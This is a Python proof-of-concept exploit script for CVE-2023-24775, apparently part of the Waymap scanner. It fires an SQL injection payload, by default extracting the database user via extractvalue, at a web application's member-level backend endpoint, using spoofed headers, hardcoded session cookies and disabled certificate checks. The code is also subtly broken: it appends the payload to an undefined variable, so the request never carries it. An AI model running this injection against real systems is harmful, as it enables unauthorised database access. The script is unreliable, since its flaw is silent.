# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2023-24775

import requests
import urllib.parse
import uuid
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_csrf_token():
    csrf_token = uuid.uuid4()
    return str(csrf_token).replace('-', '')

def common_headers(profile_url):
    csrf_token = generate_csrf_token()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*",
        "Accept-Language": "zh-CN,zh",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRF-TOKEN": csrf_token,
        "Host": profile_url,
        "Content-Type": "application/x-www-form-urlencoded",
        "charset": "UTF-8",
        "Accept-Encoding": "gzip"
    }
    return headers

def scan_cve_2023_24775(profile_url):
    headers = common_headers(profile_url)
    profile_url = f"{profile_url}/backend/member.memberLevel/index?parentField=pid&"

    cookies = {
        'Hm_lvt_ce074243117e698438c49cd037b593eb': '1673498041',
        'PHPSESSID': '591a908579ac738f0fc0f53d05c6aa51',
        'think_lang': 'zh-cn',
    }

    sqli = input("Input selectFields[name]=name&selectFields[value]=your select sqli: ")
    if not sqli:
        sqli = "extractvalue(1, concat(char(126), user()))"
    else:
        sqli = urllib.parse.quote_plus(sqli)

    url += f"selectFields%5Bname%5D=name&selectFields%5Bvalue%5D={sqli}"
    print(f"Request URL: {profile_url}")

    sqli_request = requests.get(profile_url, cookies=cookies, headers=headers, verify=False)
    print(sqli_request.text)

    if 'message' in sqli_request.text:
        print('**POC CVE-2023-24775: SQLi works** :)')
    else:
        print('**POC CVE-2023-24775: SQLi does not worked** :(')
